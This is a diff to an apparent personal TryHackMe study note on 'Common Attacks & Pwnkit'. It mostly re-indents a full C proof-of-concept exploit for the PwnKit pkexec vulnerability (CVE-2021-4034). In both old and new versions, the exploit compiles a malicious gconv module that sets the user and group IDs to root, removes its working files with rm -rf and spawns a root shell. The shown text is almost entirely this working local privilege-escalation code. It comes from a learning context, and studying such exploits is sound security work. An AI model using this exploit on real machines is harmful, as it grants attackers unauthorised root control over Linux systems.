@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2022-02-03-tryhackme-common-atta
 author: 100007
 ---
 
-# TryHackMe: Common Attacks & Pwnkit
-
-**author:** Nathan Acks  
-**date:** 2022-02-03
-
 # Common Attacks
 
 ## Public Network Safety
@@ -35,43 +30,45 @@ Quick-n-dirty Pwnkit exploit:
 
 ```
 /*
-* Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit's pkexec (CVE-2021-4034) by Andris Raugulis <moo@arthepsy.eu>
-* Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
-*/
+ * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit's pkexec (CVE-2021-4034) by Andris Raugulis <moo@arthepsy.eu>
+ * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
+ */
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 
-char *shell =
-"#include <stdio.h>
+char *shell = 
+	"#include <stdio.h>
 "
-"#include <stdlib.h>
+	"#include <stdlib.h>
 "
-"#include <unistd.h>
+	"#include <unistd.h>
+
 "
-"void gconv() {}
+	"void gconv() {}
 "
-"void gconv_init() {
+	"void gconv_init() {
 "
-" setuid(0); setgid(0);
+	"	setuid(0); setgid(0);
 "
-" seteuid(0); setegid(0);
+	"	seteuid(0); setegid(0);
 "
-" system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");
+	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");
 "
-" exit(0);
+	"	exit(0);
 "
-"}";
+	"}";
+
 int main(int argc, char *argv[]) {
-FILE *fp;
-system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
-system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
-fp = fopen("pwnkit/pwnkit.c", "w");
-fprintf(fp, "%s", shell);
-fclose(fp);
-system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
-char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
-execve("/usr/bin/pkexec", (char*[]){NULL}, env);
+	FILE *fp;
+	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
+	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
+	fp = fopen("pwnkit/pwnkit.c", "w");
+	fprintf(fp, "%s", shell);
+	fclose(fp);
+	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
+	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
+	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
 }
 ```
 
